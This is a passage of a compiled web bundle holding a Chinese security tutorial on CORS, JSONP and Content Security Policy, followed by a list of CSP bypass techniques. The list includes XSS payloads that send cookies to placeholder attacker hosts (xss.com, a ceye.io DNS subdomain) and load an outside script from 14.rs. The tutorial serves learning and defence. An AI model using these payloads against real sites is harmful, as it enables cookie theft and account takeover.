keyword"}),"Access-Control-Max-Age:")," 1728000\t\t\t\t\t\t//用来指定本次预检请求的有效期，单位为秒"))),Object(n.b)("p",null,'一旦服务器通过了"预检"请求，以后每次浏览器正常的',Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"请求，就都跟简单请求一样，会有一个Origin头信息字段。"),Object(n.b)("p",null,"服务器的回应，也都会有一个",Object(n.b)("inlineCode",{parentName:"p"},"Access-Control-Allow-Origin"),"头信息字段"),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"Github"),"上的一个POC：",Object(n.b)("a",c({parentName:"p"},{href:"https://github.com/trustedsec/cors-poc",target:"_blank"}),"https://github.com/trustedsec/cors-poc")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-bash"}),"python3 -m http.server --cgi"))),Object(n.b)("h3",{className:"__internal",id:"与jsonp的比较"},"与JSONP的比较",Object(n.b)("a",c({parentName:"h3"},{href:"#%E4%B8%8Ejsonp%E7%9A%84%E6%AF%94%E8%BE%83","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"与",Object(n.b)("inlineCode",{parentName:"p"},"JSONP"),"的使用目的相同，但是比",Object(n.b)("inlineCode",{parentName:"p"},"JSONP"),"更强大。"),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"JSONP"),"只支持GET请求，",Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"支持所有类型的HTTP请求。"),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"JSONP"),"的优势在于支持老式浏览器，以及可以向不支持",Object(n.b)("inlineCode",{parentName:"p"},"CORS"),"的网站请求数据。"),Object(n.b)("h1",{className:"__internal",id:"csp是什么？如何设置csp？"},"CSP是什么？如何设置CSP？",Object(n.b)("a",c({parentName:"h1"},{href:"#csp%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AEcsp%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"CSP"),"（Content Security Policy）浏览器内容安全策略， 为了缓解部分跨站脚本问题 。 "),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"CSP"),"的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 "),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"两种方法启用",Object(n.b)("inlineCode",{parentName:"strong"},"CSP"))),Object(n.b)("div",{className:"rcpress-highlight","data-language":"c"},Object(n.b)("pre",c({parentName:"div"},{className:"language-c"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-c"}),Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"1.")," 添加HTTP头信息；\nContent",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"Security",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"Policy",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),":")," script",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"src ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'self'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")," object",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"src ",Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'none'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")," style",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"src cdn",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"example",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"org",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";")," child",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"src https",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),":"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token number"}),"2.")," 使用",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"meta",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"标签\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"<"),"meta http",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),"equiv",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),'"Content-Security-Policy"')," content",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"\"script-src 'self'; object-src 'none'; style-src cdn.example.org; child-src https:\""),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">"),"\n参数解释\n\nscript",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"src"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"脚本",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"：只信任当前域名\nobject",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"-"),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"src"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"标签",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"：不信任任何URL，即不加载任何资源\n样式表：只信任http",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),":"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),"cdn",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"example",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"org\n框架（frame）：必须使用HTTPS协议加载"))),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"CSP"),"各种限制选项参考：",Object(n.b)("a",c({parentName:"p"},{href:"https://www.zhihu.com/question/21979782",target:"_blank"}),"知乎回答"),"，",Object(n.b)("a",c({parentName:"p"},{href:"https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/",target:"_blank"}),"CSP基础语法和绕过")),Object(n.b)("h2",{className:"__internal",id:"绕过csp1、2、3、5-重点"},"绕过CSP(1、2、3、5 重点)",Object(n.b)("a",c({parentName:"h2"},{href:"#%E7%BB%95%E8%BF%87csp1%E3%80%812%E3%80%813%E3%80%815-%E9%87%8D%E7%82%B9","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"1.",Object(n.b)("inlineCode",{parentName:"strong"},"URL"),"跳转")),Object(n.b)("p",null,"在",Object(n.b)("inlineCode",{parentName:"p"},"default-src")," 'none'的情况下，可以使用meta标签实现跳转"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"meta")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"http-equiv"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"refresh",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"content"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"1;url=http://www.xss.com/x.php?c=[cookie]",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,"在允许",Object(n.b)("inlineCode",{parentName:"p"},"unsafe-inline"),"的情况下，可以用",Object(n.b)("inlineCode",{parentName:"p"},"window.location"),"，或者",Object(n.b)("inlineCode",{parentName:"p"},"window.open"),"之类的方法进行跳转绕过"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"script"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",c({parentName:"code"},{className:"token script"}),Object(n.b)("span",c({parentName:"span"},{className:"token language-javascript"}),"\n  window",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),"location",Object(n.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token string"}),'"http://www.xss.com/x.php?c=[cookie]"'),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n")),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"script"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"2.",Object(n.b)("inlineCode",{parentName:"strong"},"link"),"标签预加载")),Object(n.b)("p",null,"在Firefox下，可以将cookie作为子域名，用",Object(n.b)("inlineCode",{parentName:"p"},"dns预解析"),"的方式把cookie带出去，查看",Object(n.b)("inlineCode",{parentName:"p"},"dns"),"服务器的日志就能得到cookie "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"link")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"rel"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"dns-prefetch",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"href"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"//[cookie].xxx.ceye.io",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"3.利用浏览器补全")," "),Object(n.b)("p",null,"有些网站限制只有某些脚本才能使用，往往会使用script标签的nonce属性，只有nonce一致的脚本才生效 "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"http"},Object(n.b)("pre",c({parentName:"div"},{className:"language-http"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-http"}),Object(n.b)("span",c({parentName:"code"},{className:"token header-name keyword"}),"Content-Security-Policy:")," default-src 'none';script-src 'nonce-abc'\n\n//CSP设置nonce为abc属性的标签"))),Object(n.b)("p",null,"那么当脚本插入点为如下的情况时"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"p"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),"插入点",Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"p"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"script")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"id"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"aa",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"nonce"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"abc",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",c({parentName:"code"},{className:"token script"}),Object(n.b)("span",c({parentName:"span"},{className:"token language-javascript"}),"document",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"span"},{className:"token function"}),"write"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",c({parentName:"span"},{className:"token string"}),"'CSP'"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"))),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"script"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,"可以插入"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),'<script src=//14.rs a="'))),Object(n.b)("p",null,"这样会拼成一个新的script标签，其中的",Object(n.b)("inlineCode",{parentName:"p"},"src"),"可以自由设定"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"p"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"script")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"src"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),"//14.rs")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"a"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"</p>\n<script id=",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),'aa"')," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"nonce"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"abc",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),"document.write('CSP');",Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"script"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"4.代码重用")),Object(n.b)("p",null,"假设页面中使用了",Object(n.b)("inlineCode",{parentName:"p"},"Jquery-mobile"),"库，并且",Object(n.b)("inlineCode",{parentName:"p"},"CSP"),'策略中包含"',Object(n.b)("inlineCode",{parentName:"p"},"script-src")," '",Object(n.b)("inlineCode",{parentName:"p"},"unsafe-eval"),'\' "或者"',Object(n.b)("inlineCode",{parentName:"p"},"script-src")," 'strict-dynamic'\""),Object(n.b)("p",null,"那么下面的向量就可以绕过",Object(n.b)("inlineCode",{parentName:"p"},"CSP"),"："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"div")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"data-role"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),"popup")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"id"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"'"),"<script>alert(1)<\/script>",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"'")),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"div"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"5.",Object(n.b)("inlineCode",{parentName:"strong"},"ifrmae"))),Object(n.b)("p",null,"(1) 如果页面A中有",Object(n.b)("inlineCode",{parentName:"p"},"CSP"),"限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过",Object(n.b)("inlineCode",{parentName:"p"},"CSP"),"： "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"iframe")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"src"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"B",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"iframe"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,"(2) 在Chrome下，",Object(n.b)("inlineCode",{parentName:"p"},"iframe"),"标签支持",Object(n.b)("inlineCode",{parentName:"p"},"csp"),"属性，这有时候可以用来绕过一些防御，"),Object(n.b)("p",null,'例如"',Object(n.b)("a",c({parentName:"p"},{href:"http://xxx%22%E9%A1%B5%E9%9D%A2%E6%9C%89%E4%B8%AA%60js%60%E5%BA%93%E4%BC%9A%E8%BF%87%E6%BB%A4%60XSS%60%E5%90%91%E9%87%8F%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%60csp%60%E5%B1%9E%E6%80%A7%E6%9D%A5%E7%A6%81%E6%8E%89%E8%BF%99%E4%B8%AA%60js%60%E5%BA%93",target:"_blank"}),'http://xxx"页面有个`js`库会过滤`XSS`向量，我们就可以使用`csp`属性来禁掉这个`js`库')),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"iframe")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"csp"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"script-src 'unsafe-inline'",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"src"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"http://xxx",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">")),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"</"),"iframe"),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"6.",Object(n.b)("inlineCode",{parentName:"strong"},"meta"),"标签")),Object(n.b)("p",null," meta标签有一些不常用的功能有时候有奇效：\nmeta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过",Object(n.b)("inlineCode",{parentName:"p"},"CSP nonce")," "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"meta")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"http-equiv"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"cache-control",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"content"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"public",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null," meta可以设置Cookie（Firefox下），可以结合self-xss利用 "),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",c({parentName:"div"},{className:"language-html"}),Object(n.b)("code",c({parentName:"pre"},{className:"language-html"}),Object(n.b)("span",c({parentName:"code"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token tag"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"<"),"meta")," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"http-equiv"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"Set-Cookie",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'))," ",Object(n.b)("span",c({parentName:"span"},{className:"token attr-name"}),"Content"),Object(n.b)("span",c({parentName:"span"},{className:"token attr-value"}),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),"="),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"'),"cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/",Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),'"')),Object(n.b)("span",c({parentName:"span"},{className:"token punctuation"}),">"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"两个",Object(n.b)("inlineCode",{parentName:"strong"},"CSP"),"绕过案例")),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/",target:"_blank"}),"https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/")),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://www.mi1k7ea.com/2019/08/18/%E5%88%A9%E7%94%A8HTML%E6%B3%A8%E5%85%A5%E5%8A%AB%E6%8C%81%E6%A0%87%E7%AD%BEBypass-CSP/",target:"_blank"}),"https://www.mi1k7ea.com/2019/08/18/%E5%88%A9%E7%94%A8HTML%E6%B3%A8%E5%85%A5%E5%8A%AB%E6%8C%81%E6%A0%87%E7%AD%BEBypass-CSP/")))}o.isMDXComponent=!0,o=o}}]);